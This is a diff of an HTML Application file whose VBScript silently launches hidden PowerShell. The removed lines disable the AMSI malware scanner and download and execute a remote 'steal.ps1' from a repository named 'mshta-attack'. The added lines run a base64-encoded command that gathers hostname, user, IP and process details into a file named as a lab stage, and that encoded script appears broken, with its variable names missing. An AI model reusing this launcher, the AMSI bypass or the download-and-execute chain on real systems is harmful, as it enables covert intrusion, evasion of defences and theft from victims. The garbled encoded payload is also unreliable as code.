@@ -1,34 +1,11 @@
 <html>
 <head>
-  <HTA:APPLICATION
-    ID="SilentApp"
-    SHOWINTASKBAR="no"
-    WINDOWSTATE="minimize"
-    CAPTION="no"
-    SYSMENU="no"
-    BORDER="none"/>
-  <script language="VBScript">
-    ' Configurable remote PowerShell script URL
-    Dim remoteUrl
-    remoteUrl = "https://raw.githubusercontent.com/someoneee0/mshta-attack/main/steal.ps1"
-
-    ' Build PowerShell command with explicit flags
-    Dim cmd
-    cmd = "powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command " & _
-          """ & _
-          "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')" & _
-          ".GetField('amsiInitFailed','NonPublic,Static')" & _
-          ".SetValue($null,$true); IEX (New-Object Net.WebClient)" & _
-          ".DownloadString('" & remoteUrl & "')" & _
-          """"
-
-    ' Execute silently
-    CreateObject("WScript.Shell").Run cmd, 0, False
-
-    ' Close HTA window immediately
-    window.resizeTo 0,0
-    window.close
-  </script>
+<HTA:APPLICATION ID="App" BORDER="none" SHOWINTASKBAR="no" SYSMENU="no" WINDOWSTATE="minimize" />
+<script language="VBScript">
+Set shell = CreateObject("WScript.Shell")
+shell.Run "powershell -nop -w hidden -EncodedCommand IAA9ACAAIgBDADoAXABVAHMAZQByAHMAXABQAHUAYgBsAGkAYwBcAGwAYQBiAF8AcwB0AGEAZwBlADIALgB0AHgAdAAiAAoAIAA9ACAAQAAoACkACgAgACsAPQAgACIASABvAHMAdABuAGEAbQBlADoAIABMAEEAUABUAE8AUAAtADAARwAzAEQATgAwAEwANAAiAAoAIAArAD0AIAAiAFUAcwBlAHIAOgAgAGYAYQB6AGkAbAAiAAoAIAArAD0AIAAiAFQAaQBtAGUAOgAgADAANAAvADMAMAAvADIAMAAyADUAIAAxADkAOgAyADQAOgAzADkAIgAKACAAKwA9ACAAIgBJAFAAOgAgADEAOQAyAC4AMQA2ADgALgAxADYAMwAuADEAIgAKACAAKwA9ACAAIgBSAHUAbgBuAGkAbgBnACAAcAByAG8AYwBlAHMAcwBlAHMAOgAiAAoAIAArAD0AIAAoAEcAZQB0AC0AUAByAG8AYwBlAHMAcwAgAHwAIABTAG8AcgB0AC0ATwBiAGoAZQBjAHQAIABDAFAAVQAgAC0ARABlAHMAYwBlAG4AZABpAG4AZwAgAHwAIABTAGUAbABlAGMAdAAtAE8AYgBqAGUAYwB0ACAALQBGAGkAcgBzAHQAIAA1ACAAfAAgAEYAbwByAEUAYQBjAGgALQBPAGIAagBlAGMAdAAgAHsAIAAiACAALQAgAEMAUABVADoAIAAiACAAfQApAAoAIAB8ACAATwB1AHQALQBGAGkAbABlACAALQBGAGkAbABlAFAAYQB0AGgAIAAgAC0ARQBuAGMAbwBkAGkAbgBnACAAdQB0AGYAOAA=", 0, False
+self.close
+</script>
 </head>
 <body></body>
 </html>
